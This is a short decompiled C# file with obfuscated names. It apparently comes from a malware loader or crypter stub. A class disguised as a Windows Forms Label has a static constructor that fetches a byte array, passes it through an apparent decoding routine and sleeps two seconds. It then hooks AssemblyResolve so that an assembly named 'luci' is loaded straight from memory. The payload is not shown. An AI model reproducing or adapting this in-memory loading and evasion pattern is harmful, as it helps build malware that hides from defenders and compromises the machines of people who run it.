using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace d;

internal sealed class A : Label
{
	[CompilerGenerated]
	private sealed class y
	{
		public byte[] t;

		internal Assembly B(object object_0, ResolveEventArgs resolveEventArgs_0)
		{
			AppDomain appDomain = (AppDomain)object_0;
			if (resolveEventArgs_0.Name.Contains("luci"))
			{
				return appDomain.Load(t);
			}
			return null;
		}
	}

	static A()
	{
		byte[] t = smethod_0(c.smethod_1());
		c.smethod_0(2000L);
		AppDomain.CurrentDomain.AssemblyResolve += delegate(object object_0, ResolveEventArgs resolveEventArgs_0)
		{
			AppDomain appDomain = (AppDomain)object_0;
			return resolveEventArgs_0.Name.Contains("luci") ? appDomain.Load(t) : null;
		};
	}

	public static byte[] smethod_0(byte[] byte_0)
	{
		B.smethod_0(byte_0);
		return byte_0;
	}

	[STAThread]
	public static void Main()
	{
		r.smethod_0();
	}
}
